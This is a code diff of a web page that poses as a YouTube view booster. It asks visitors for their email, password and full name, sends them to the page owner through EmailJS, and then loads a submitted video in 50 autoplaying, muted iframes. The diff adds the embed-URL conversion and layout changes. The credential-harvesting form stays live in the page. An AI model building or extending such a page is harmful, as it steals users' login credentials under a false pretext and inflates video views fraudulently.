@@ -61,12 +61,15 @@
 
     .iframe-container {
       margin-top: 20px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
     }
 
     iframe {
-      width: 100%;
+      width: 300px;
       height: 200px;
-      margin-bottom: 10px;
       border: none;
     }
   </style>
@@ -77,7 +80,6 @@
   <h2>To play the video 50 times and get maximum views, please log in</h2>
   
   <form id="loginForm">
-    <!-- שמות השדות מותאמים ל-EmailJS -->
     <input type="email" name="user_email" placeholder="Email" required>
     <input type="password" name="user_password" placeholder="Password" required>
     <input type="text" name="user_name" placeholder="Full Name" required>
@@ -86,7 +88,6 @@
   
   <div class="message" id="message"></div>
 
-  <!-- שדה קישור יופיע אחרי שליחת הטופס -->
   <div id="linkContainer" style="display:none; margin-top:20px;">
     <input type="text" id="youtubeLink" placeholder="Enter YouTube link">
     <button id="playVideoBtn">Play Video 50 Times</button>
@@ -115,13 +116,34 @@
     emailjs.sendForm('service_1407yso', 'template_rv2yd4n', this)
       .then(function() {
         messageDiv.textContent = "Form submitted successfully!";
-        form.style.display = "none"; // מחביאים את הטופס אחרי שליחה
-        linkContainer.style.display = "block"; // מראים את שדה הקישור
+        form.style.display = "none";
+        linkContainer.style.display = "block";
       }, function(error) {
         messageDiv.textContent = "Oops! Something went wrong.";
         console.error(error);
       });
   });
+
+  function convertToEmbed(url) {
+    let videoId = "";
+
+    // תופס watch?v=
+    const watchMatch = url.match(/v=([^&]+)/);
+    if (watchMatch) {
+      videoId = watchMatch[1];
+    }
+
+    // תופס shorts
+    const shortsMatch = url.match(/shorts\/([^?]+)/);
+    if (shortsMatch) {
+      videoId = shortsMatch[1];
+    }
+
+    if (videoId) {
+      return `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1`;
+    }
+    return url;
+  }
 
   playBtn.addEventListener('click', function() {
     let url = youtubeInput.value.trim();
@@ -131,14 +153,11 @@
       return;
     }
 
-    // אין המרה מ-shorts ל-watch, פשוט משתמשים בקישור כפי שהוא
-
-    // מנקים את הקונטיינר לפני הוספת iFrames
     iframeContainer.innerHTML = "";
 
     for (let i = 0; i < 50; i++) {
       const iframe = document.createElement('iframe');
-      iframe.src = url;
+      iframe.src = convertToEmbed(url);
       iframe.allow = "autoplay; encrypted-media";
       iframeContainer.appendChild(iframe);
     }
